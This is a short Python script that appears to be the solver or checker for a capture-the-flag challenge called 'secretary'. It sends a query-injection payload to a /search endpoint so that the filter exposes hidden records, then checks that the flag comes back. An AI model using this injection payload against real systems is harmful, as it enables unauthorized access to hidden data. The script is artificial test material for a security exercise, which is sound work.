import requests
import argparse
import yaml
from pathlib import Path
import logging

logger = logging.getLogger('secretary')

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / 'meta.yml'))['flags']

def test(url):
    res = requests.get(f'{url}/search', params={'query': '")) or Hidden == true or Name = (("'})
    assert FLAG in res.text, res.text

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', default='http://localhost:5000', nargs='?')
    args = parser.parse_args()

    test(args.url)
